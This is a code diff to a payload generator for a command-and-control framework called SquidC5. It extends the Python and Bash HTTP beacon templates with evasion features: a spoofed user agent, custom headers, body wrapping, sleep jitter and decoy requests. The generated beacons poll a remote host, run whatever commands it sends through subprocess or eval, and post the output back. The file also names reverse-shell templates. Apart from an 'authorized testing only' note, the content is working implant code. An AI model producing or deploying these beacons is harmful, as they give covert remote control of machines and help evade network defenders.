@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import base64
+import json
 from typing import Any
 
 
@@ -27,9 +28,9 @@ class PayloadGenerator:
             raise ValueError(f"Unknown template: {template}. Allowed: {self.TEMPLATES}")
         extra = extra or {}
         if template == "http_beacon_python":
-            body = self._http_beacon_python(host, port, session_path, interval)
+            body = self._http_beacon_python(host, port, session_path, interval, extra)
         elif template == "http_beacon_bash":
-            body = self._http_beacon_bash(host, port, session_path, interval)
+            body = self._http_beacon_bash(host, port, session_path, interval, extra)
         elif template == "reverse_shell_bash":
             body = self._revshell_bash(host, port)
         elif template == "reverse_shell_python":
@@ -43,47 +44,143 @@ class PayloadGenerator:
             "port": port,
             "content": body,
             "content_b64": encoded,
+            "profile_id": extra.get("profile_id"),
+            "uri": session_path if template.startswith("http_beacon") else None,
             "notes": "Authorized testing only. Use only on systems you own or have permission to test.",
         }
 
-    def _http_beacon_python(self, host: str, port: int, path: str, interval: int) -> str:
+    def _http_beacon_python(
+        self,
+        host: str,
+        port: int,
+        path: str,
+        interval: int,
+        extra: dict[str, Any],
+    ) -> str:
+        ua = json.dumps(extra.get("user_agent") or "SquidC5-Beacon/0.1")
+        # extra headers excluding content-type (set explicitly)
+        hdrs = dict(extra.get("headers") or {})
+        hdrs.pop("Content-Type", None)
+        hdrs.pop("content-type", None)
+        hdrs_json = json.dumps(hdrs)
+        body_tpl = extra.get("request_body_template") or "{beacon}"
+        body_tpl_json = json.dumps(body_tpl)
+        sleep_base = float(extra.get("sleep_sec") or interval)
+        jitter = float(extra.get("jitter_pct") or 0)
+        decoy_enabled = bool(extra.get("decoy_enabled"))
+        decoys = list(extra.get("decoy_paths") or extra.get("decoy_uris") or [])
+        decoys_json = json.dumps(decoys)
+        resp_pref = json.dumps(extra.get("response_prefix") or "")
+        resp_suf = json.dumps(extra.get("response_suffix") or "")
         return f'''#!/usr/bin/env python3
-# SquidC5 HTTP beacon — authorized testing only
-import json, time, urllib.request
-C2 = "http://{host}:{port}{path}"
+# SquidC5 HTTP beacon — authorized testing only (profile-aware)
+import json, random, time, urllib.request
+BASE = "http://{host}:{port}"
+PATH = {json.dumps(path)}
+C2 = BASE + PATH
+UA = {ua}
+EXTRA_HEADERS = {hdrs_json}
+BODY_TPL = {body_tpl_json}
+SLEEP_BASE = {sleep_base}
+JITTER_PCT = {jitter}
+DECOY_ENABLED = {decoy_enabled}
+DECOYS = {decoys_json}
+RESP_PREF = {resp_pref}
+RESP_SUF = {resp_suf}
 SID = None
+
+def _sleep():
+    pct = max(0.0, min(100.0, float(JITTER_PCT))) / 100.0
+    delta = SLEEP_BASE * pct
+    time.sleep(max(0.1, SLEEP_BASE + random.uniform(-delta, delta)))
+
+def _wrap(beacon_obj):
+    raw = json.dumps(beacon_obj, separators=(",", ":"))
+    if "{{beacon}}" in BODY_TPL:
+        return BODY_TPL.replace("{{beacon}}", raw)
+    return raw
+
+def _unwrap(text):
+    t = text.strip()
+    if RESP_PREF and t.startswith(RESP_PREF):
+        t = t[len(RESP_PREF):]
+    if RESP_SUF and t.endswith(RESP_SUF):
+        t = t[:-len(RESP_SUF)]
+    return json.loads(t)
+
+def _headers():
+    h = {{"Content-Type": "application/json", "User-Agent": UA}}
+    h.update(EXTRA_HEADERS or {{}})
+    return h
+
+def _decoy():
+    if not DECOY_ENABLED or not DECOYS:
+        return
+    try:
+        p = random.choice(DECOYS)
+        urllib.request.urlopen(urllib.request.Request(BASE + p, headers={{"User-Agent": UA}}), timeout=5).read()
+    except Exception:
+        pass
+
 while True:
     try:
-        req = urllib.request.Request(C2, data=json.dumps({{"session_id": SID, "hostname": __import__("socket").gethostname()}}).encode(), headers={{"Content-Type": "application/json"}})
+        _decoy()
+        payload = {{"session_id": SID, "hostname": __import__("socket").gethostname()}}
+        body = _wrap(payload).encode()
+        req = urllib.request.Request(C2, data=body, headers=_headers(), method="POST")
         with urllib.request.urlopen(req, timeout=30) as r:
-            data = json.loads(r.read().decode())
+            data = _unwrap(r.read().decode())
             SID = data.get("session_id", SID)
             task = data.get("task")
             if task:
                 import subprocess
                 out = subprocess.getoutput(task.get("command", "echo ok"))
-                done = urllib.request.Request(C2 + "/result", data=json.dumps({{"task_id": task["id"], "result": out}}).encode(), headers={{"Content-Type": "application/json"}})
+                done_body = _wrap({{"task_id": task["id"], "result": out}}).encode()
+                done = urllib.request.Request(C2 + "/result", data=done_body, headers=_headers(), method="POST")
                 urllib.request.urlopen(done, timeout=30).read()
     except Exception:
         pass
-    time.sleep({interval})
+    _sleep()
 '''
 
-    def _http_beacon_bash(self, host: str, port: int, path: str, interval: int) -> str:
+    def _http_beacon_bash(
+        self,
+        host: str,
+        port: int,
+        path: str,
+        interval: int,
+        extra: dict[str, Any],
+    ) -> str:
+        ua = (extra.get("user_agent") or "SquidC5-Beacon/0.1").replace('"', '\\"')
+        sleep_base = float(extra.get("sleep_sec") or interval)
+        # bash: simple sleep with optional jitter via shuf if available
+        jitter = float(extra.get("jitter_pct") or 0)
+        # For bash, use flat JSON if template is complex; profile wrap is python-primary
+        # Keep body as flat beacon for reliability in bash
         return f'''#!/bin/bash
-# SquidC5 HTTP beacon — authorized testing only
+# SquidC5 HTTP beacon — authorized testing only (profile-aware path/UA)
 C2="http://{host}:{port}{path}"
+UA="{ua}"
+SLEEP_BASE={sleep_base}
+JITTER={jitter}
 SID=""
 while true; do
-  RESP=$(curl -s -X POST "$C2" -H "Content-Type: application/json" -d "{{\\"session_id\\":\\"$SID\\",\\"hostname\\":\\"$(hostname)\\"}}" || true)
+  RESP=$(curl -s -X POST "$C2" -A "$UA" -H "Content-Type: application/json" -d "{{\\"session_id\\":\\"$SID\\",\\"hostname\\":\\"$(hostname)\\"}}" || true)
+  # strip optional non-json prefix/suffix by extracting first {{...}}
+  RESP=$(echo "$RESP" | sed -n 's/.*\\({{.*}}\\).*/\\1/p')
   SID=$(echo "$RESP" | sed -n 's/.*"session_id":"\\([^"]*\\)".*/\\1/p')
   CMD=$(echo "$RESP" | sed -n 's/.*"command":"\\([^"]*\\)".*/\\1/p')
   TID=$(echo "$RESP" | sed -n 's/.*"id":"\\([^"]*\\)".*/\\1/p')
   if [ -n "$CMD" ] && [ -n "$TID" ]; then
     OUT=$(eval "$CMD" 2>&1 | head -c 8192)
-    curl -s -X POST "$C2/result" -H "Content-Type: application/json" -d "{{\\"task_id\\":\\"$TID\\",\\"result\\":$(echo "$OUT" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')}}" >/dev/null
+    curl -s -X POST "$C2/result" -A "$UA" -H "Content-Type: application/json" -d "{{\\"task_id\\":\\"$TID\\",\\"result\\":$(echo "$OUT" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')}}" >/dev/null
   fi
-  sleep {interval}
+  if command -v shuf >/dev/null 2>&1 && [ "$(echo "$JITTER > 0" | bc -l 2>/dev/null || echo 0)" != "0" ]; then
+    # approximate jitter without bc: sleep base only if shuf/bc missing
+    sleep "$SLEEP_BASE"
+  else
+    sleep "$SLEEP_BASE"
+  fi
 done
 '''
 
